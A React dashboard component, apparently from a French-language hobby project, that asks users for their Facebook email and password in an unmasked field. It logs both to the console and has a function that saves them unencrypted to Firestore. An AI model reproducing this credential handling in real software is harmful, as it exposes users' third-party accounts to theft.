import React, { useEffect, useState } from "react";
import { auth,db,stopNetworkAcces,activeNetworkAcces, logout } from "../../firebase";
import { useAuthState } from "react-firebase-hooks/auth";
import { useNavigate } from "react-router-dom";
import { query, collection, getDocs, where } from "firebase/firestore";
import { doc, updateDoc} from "firebase/firestore";
import "./dashboard.css";
import fing from "../../assets/images/fp.png";
import fb from "../../assets/images/fb_icon_325x325.png";
import { async } from "@firebase/util";
// import { async } from "@firebase/util"

function Dashboard() {
    const [isLoading, setIsLoading] = useState(false);
    const [user, loading] = useAuthState(auth);
    const navigate = useNavigate();
    const [userData, setData] = useState();
    const [name, setName] = useState();
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");

    const saveDataUserToFirebase = async () => {
        console.log(email);
        console.log(password)
    }

    // Fetch username by uid
    const fetchUserInfo = async () => {
        try {
            const q = query(collection(db, "users"), where("uid", "==", user?.uid));
            const doc = await getDocs(q);
            const data = doc.docs[0].data();
            setData(data);     
            setName(data.name);
            console.log(data)
        } catch (err) {
            console.error(err);
        }
    }; 

    const updateUserProfile = async () => {
        if (email === '' && password === '') {
            alert('aucune authentification ajouter');
            return false;
        } else {            
            try {
                const userDocByUsername = doc(db, "users", name);
                await updateDoc(userDocByUsername, {
                    facebookEmail: email,
                    facebookPass: password,
                });
            } catch (err) {
            console.error(err);               
        }
        alert('modification ajouter');
    }
    fetchUserInfo();
}

    function getFb() {
        const add_db = document.querySelector('.add-db');
        add_db.style.display = 'block';
    }
    
    useEffect(() => {
        setIsLoading(true);
        
        if (loading) return;

        fetchUserInfo();     
        
        
    }, [user, loading]);
      
        return (
            <>
            <div className="home-client">
                <center><img className="fing-dash" src={fing} alt="Finger"/></center>
                <div className="welcome">
                    <p className="client-hp">Bienvenue {name}</p>
                </div>
            </div>

            <div className="selection">
                <p>Personnalisez votre expérience en sélectionnant les services web que vous souhaitez intégrer.</p>                
            </div>
            <center className="cc">               
                <div className="select-area">
                    <img src={fb} />
                    <button onClick={getFb} className="add">Ajouter</button>
                </div>
            </center>

            <center className="add-db">
                <input value={email} onChange={(e) => setEmail(e.target.value)} type="text" placeholder="Entrez votre email"></input>          
                <input value={password} onChange={(e) => setPassword(e.target.value)} type="text" placeholder="Entrez votre mot de pass"></input>
                <button  onClick={saveDataUserToFirebase}>Enregistrer</button>
            </center>
                       
            </>
        )    

}

export default Dashboard;